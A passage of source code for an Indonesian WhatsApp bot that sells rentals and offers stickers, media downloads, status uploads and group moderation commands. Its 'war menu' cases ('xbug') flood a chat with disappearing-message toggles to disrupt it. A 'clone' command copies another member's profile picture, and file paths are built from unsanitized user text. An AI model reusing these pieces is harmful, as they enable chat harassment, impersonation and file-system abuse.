menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer gopay dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `GOPAY : 0${Nogpy}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case '👍':
listMsg = {
 buttonText: 'OWNER 👨‍💻',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname}* \n\nsilahkan tekan "OWNER" untuk menuju ke nomer owner`,
 sections: [
                     {
                      "title": `GOPAY : 0${Nogpy}`,
 rows: [
                           {
                              "title": "👨‍💻",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'gk':
listMsg = {
 buttonText: 'MULAI',
 footerText: '*Sewa Bot © 2021*',
 description: `Emm y udah lah mending main game aja`,
 sections: [
                     {
                      "title": `Cari ☺️`,
 rows: [
                           {
                              "title": "☺️\n\nIya bg gw emang 🐶, maaf bg lain kali gw sewa ko",
                              "rowId": ""
                           },
                           {
                              "title": "☺️\n\nIya bg gw emang 🐷, maaf bg lain kali gw sewa ko",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break		
case 'katalog':
      list = await ALIYABOT.prepareMessageFromContent(from, {
    "listMessage": {
      "title": "PAYMENT",
      "description": "CLICK",
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "62858157008613"
              },
              {
              	"productId": "6431678466857362"
              },
              {
              	"productId": "4392524570816732"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "jpegThumbnail": iye
        },
        "businessOwnerJid": "62858157008613@s.whatsapp.net",
      },
      "footerText": " Sewa Bot Alya✓Chan︎"
    }
  }, {quoted:mek})
  ALIYABOT.relayWAMessage(list, {waitForAck: true})
       
case 'triggered':
                
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    let media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia)
                    var tolink = await uptotele(media)
                let ane = await getBuffer(`https://some-random-api.ml/canvas/triggered?avatar=${tolink}`)
                fs.writeFileSync('./sticker/triggered.webp', ane)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    ALIYABOT.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})
                    
                    fs.unlinkSync(`./sticker/triggered.webp`)	
                })
                }
            
                break
  break
  case "caklontong":
  if (isBanned) return reply(mess.ban)
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   ALIYABOT.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break      
  case 'official':
  if (isBanned) return reply(mess.ban)
         return reply('OFFICIAL GRUP : https://chat.whatsapp.com/IoB5boSiSEcAwFwJwRo3FJ')
  case 'clone':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
var pp = await ALIYABOT.getProfilePicture(idk)
buffer = await getBuffer(pp)
ALIYABOT.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'addvn':
if (isBanned) return reply(mess.ban)
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await ALIYABOT.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					ALIYABOT.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
				if (isBanned) return reply(mess.ban)
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					ALIYABOT.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
case 'script':
		case 'sc':
		case 'sourcecode':	
		if (isBanned) return reply(mess.ban)
		return reply('*Bot Ini Menggunakan Script : https://github.com/AlyaCanz/AliyaCans/tree/master*')
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (isQuotedSticker) {
          if (!q)
            return grupinv(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          grupinv("tag stickenya");
        }
        break;
        case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
        case 'image':
       case 'gimage':
       case 'googleimage':
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
              reply(mess.wait)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjadi Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break                                     
case 'ppcouple':
case 'ppcp':
            reply(mess.wait)
			anu = await fetchJson(`https://ziyy.herokuapp.com/api/ppcouple?apikey=xZiyy`) 
			cowo = await getBuffer(anu.result.cowo_image)
			ALIYABOT.sendMessage(from, cowo, image, {caption: 'Ini Untuk »  *COWOK*'})
       cewe = await getBuffer(anu.result.cewe_image)
		    pll = `Ini Untuk » *CEWEK*`
   sendButImage(from, pll, `By AlyaBot`, cewe, [                      
          {
            buttonId: `${prefix}ppcouple`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break
	case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return grupinv('Teksnya?')
                    teks = body.slice(10)
                    ALIYABOT.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return grupinv('Teksnya?')
                    teks = body.slice(12)
                    ALIYABOT.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${fakeyoi}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return grupinv('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						ALIYABOT.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return grupinv('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						ALIYABOT.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return grupinv('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						ALIYABOT.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await ALIYABOT.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    ALIYABOT.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ALIYABOT.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    ALIYABOT.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ALIYABOT.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    ALIYABOT.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break                        
            case 'ssweb':
            case 'ss':
                if (args.length < 1) return reply('Urlnya mana om')
                reply(mess.wait)
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					buttons = [{buttonId: `mks`,buttonText:{displayText: `Makasih☺️`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jangan lupa donasi kak︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @callme_alya_`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              ALIYABOT.relayWAMessage(prep)
                    break;
                    case 'mks':
                    return reply('Sama Sama Kak:V')
                    break
					case 'mimpi':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break					
					case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break
				case 'artimimpi':
				 if (args.length < 1) return reply(`Penggunaan ${command} query`)
                fetchJson('https://api.zeks.xyz/api/artimimpi?apikey=' + zekskey + '&q=' + q)
                .then((kontlo)=>{
                    let b = 'Arti Mimpi :\n\n'
                    for (let x of kontlo.result.array) {
                    b += `${x}\n\n`
                    }
                    textImg(b)
                    limitAdd(sender, limit)
                })
                 .catch((err) => {
                            ALIYABOT.sendMess(ownerNumber[0], `${command} Error:` + err)
                            reply(mess.error.api)
                        })
                    break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return ALIYABOT.sendMessage(from, JSON.stringify(eval(process.exit())))
				grupinv('Okey')
				break
      case "delcmd":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (!isQuotedSticker)
          return grupinv(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        case 'ban':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				bnnd = body.slice(5)
				ban.push(`${args[0].replace('@','')}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
case 'unban':  
					
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
					delp = body.slice(7)
					ban.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					reply(`Berhasil Menghapus wa.me/${delp} dari banned`)
					break
case 'listban':
		case 'banlist'://By M4N1K
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					teks = '*List Ban:*\n\n'
					for (let manikgans of ban) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${ban.length}*`
					ALIYABOT.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": ban } })
					break
        // banchat fixed by ALIYABOT
case 'banchat':
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
if (!isGroup) return reply(mess.only.group)
if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot tidak aktif di chat ini`)
break

case 'unbanchat':
if (!itsMe && !isOwner)return reply('Only Owner')
if (!isBanchat) return reply(`udah di UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah aktif di chat ini`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await ALIYABOT.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
//// PEMBATAS MENU WAR \\\
case 'tesbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await ALIYABOT.toggleDisappearingMessages(from, 0)
break
	case 'xbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
await ALIYABOT.toggleDisappearingMessages(from, 0)
					break
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          grupinv("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return fakegroup('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          grupinv("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autoketik':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return grupinv('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break

case 'autoread':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
grupinv(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
grupinv(`Succes mematikan autoread pc`)
} else {
grupinv(`Pilih on atau off`)
}
} else {
grupinv(`*List Auto Read*\n•> gc\n•> pc`)
}
break
              case '#dc':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await ALIYABOT.groupMetadata(anu)
				ALIYABOT.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
				  case 'leave':
				  case 'endgc':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins && !mek.key.fromMe) return grupinv('Only Admin');
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				ALIYABOT.updatePresence(from, Presence.composing)
				ALIYABOT.groupLeave(from)
						break
						case 'glitch3':
anu = await fetchJson (`https://api-senku.herokuapp.com/api/textpro?theme=glitch2&text=${args.join(' ')}&apikey=${apisenku}`)
buff = await getBuffer (anu.result)
ALIYABOT.sendMessage(from, buff, image, {quoted: mek, caption: mess.success})
break						
 case 'thunder':
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=&text=${ini_txt}`)
                 buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Bilang Makaseh Anj', imageMessage: imageMsg,
              contentText:`${rply}`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: dep})
              ALIYABOT.relayWAMessage(prep)
        
                    break
      case "autojoin":
        if (!isGroup) return grupinv("Khusus di grup");
        if (!mek.key.fromMe) return grupinv("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return grupinv("Sudah aktif!!");
          autojoin = true;
          grupinv("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          grupinv("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return grupinv("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex));
          grupinv("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return grupinv("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >-------------------
      case "listonline": 
      if (isBanned) return reply(mess.ban)
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(ALIYABOT.chats.get(id).presences),
            ALIYABOT.user.jid,
          ];
          ALIYABOT.reply(
            m.chat,
            "┌─〔 Daftar Online 〕\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n└────",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
         } catch (e) {
          m.reply("");
        }
        break;        
case 'tiktod':
case 'tiktokdl':        
case 'tiktok':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply("```Mana linknya tot```")
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('```Invalid link```')
ttw = await getBuffer('https://telegra.ph/file/2c3fdde8d3c96f5bb2d8a.jpg')
pnn =await ALIYABOT.prepareMessage(from, ttw, image)
tete = [
{buttonId: `${prefix}tiktokwm ${args.join(' ')}`, buttonText: {displayText: 'WM'}, type: 1},
{buttonId: `${prefix}tiktoknowm ${args.join(' ')}`, buttonText: {displayText: 'NOWM'}, type: 1},
{buttonId: `${prefix}tiktokmusic ${args.join(' ')}`, buttonText: {displayText: 'MUSIC'}, type: 1}
]
ttbut = {
imageMessage: pnn.message.imageMessage,
contentText: `Hai Kak @${sender.split('@')[0]} Bot Telah Mendapatkan Title Tersebut , Silahkan Pilih Tombol Akses Di Bawah`,
footerText: `Alya-Bot Whas here`,
buttons: tete,
headerType: 4
}
await ALIYABOT.sendMessage(from, ttbut, MessageType.buttonsMessage, {quoted:mek})
break
case 'tiktokwm':
if (isBanned) return reply(mess.ban)
			if (!q) return reply('Linknya?')
			if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
			reply(mess.wait)
			let wem = args.join(' ')
			hx.ttdownloader(wem)
			.then(result => {
				const { wm, nowm, audio } = result
				axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
				.then(async (a) => {
					me = `*Link* : ${a.data}`
					weem = await getBuffer(wm)
					ALIYABOT.sendMessage(from,weem , MessageType.document, {mimetype: 'video/mp4',filename: `Tiktok Wm.mp4`,quoted: mek})
					})
